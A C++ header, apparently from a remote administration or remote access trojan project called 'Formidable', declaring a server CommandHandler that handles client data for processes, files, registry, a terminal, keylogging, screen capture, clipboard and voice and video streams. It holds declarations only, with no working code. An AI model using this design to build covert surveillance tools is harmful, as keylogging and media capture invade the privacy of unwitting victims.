#pragma once
#include <memory>
#include <string>
#include <functional>
#include "../../Common/Config.h"

namespace Formidable {
    struct ConnectedClient;
}

namespace Formidable {
namespace Core {

// 命令处理器 - 处理从客户端接收的各种命令
class CommandHandler {
public:
    // 处理接收到的数据包
    static void HandlePacket(uint32_t clientId, const BYTE* pData, int iLength);
    
private:
    // 处理客户端信息
    static void HandleClientInfo(uint32_t clientId, const ClientInfo* info);
    
    // 处理心跳
    static void HandleHeartbeat(uint32_t clientId, const CommandPkg* pkg, int dataLen);
    
    // 处理进程相关
    static void HandleProcessList(uint32_t clientId, const CommandPkg* pkg, int dataLen);
    static void HandleProcessKill(uint32_t clientId, const CommandPkg* pkg, int dataLen);
    static void HandleModuleList(uint32_t clientId, const CommandPkg* pkg, int dataLen);

    // 处理网络相关
    static void HandleNetworkList(uint32_t clientId, const CommandPkg* pkg, int dataLen);
    
    // 处理窗口相关
    static void HandleWindowList(uint32_t clientId, const CommandPkg* pkg, int dataLen);
    static void HandleWindowSnapshot(uint32_t clientId, const CommandPkg* pkg, int dataLen);
    
    // 处理服务相关
    static void HandleServiceList(uint32_t clientId, const CommandPkg* pkg, int dataLen);
    
    // 处理注册表相关
    static void HandleRegistryData(uint32_t clientId, const CommandPkg* pkg, int dataLen);
    
    // 处理文件相关
    static void HandleFileList(uint32_t clientId, const CommandPkg* pkg, int dataLen);
    static void HandleDriveList(uint32_t clientId, const CommandPkg* pkg, int dataLen);
    static void HandleFileData(uint32_t clientId, const CommandPkg* pkg, int dataLen);
    static void HandleFileDownload(uint32_t clientId, const CommandPkg* pkg, int dataLen);
    
    // 处理终端相关
    static void HandleTerminalData(uint32_t clientId, const CommandPkg* pkg, int dataLen);
    
    // 处理键盘记录
    static void HandleKeylog(uint32_t clientId, const CommandPkg* pkg, int dataLen);
    
    // 处理屏幕捕获
    static void HandleScreenCapture(uint32_t clientId, const CommandPkg* pkg, int dataLen);
    
    // 处理剪贴板
    static void HandleClipboard(uint32_t clientId, const CommandPkg* pkg, int dataLen);
    
    // 处理多媒体
    static void HandleVoiceStream(uint32_t clientId, const CommandPkg* pkg, int dataLen);
    static void HandleVideoStream(uint32_t clientId, const CommandPkg* pkg, int dataLen);
    
    // 处理系统信息
    static void HandleSystemInfo(uint32_t clientId, const CommandPkg* pkg, int dataLen);
    
    // 辅助函数
    static std::shared_ptr<ConnectedClient> GetClient(uint32_t clientId);
};

} // namespace Core
} // namespace Formidable
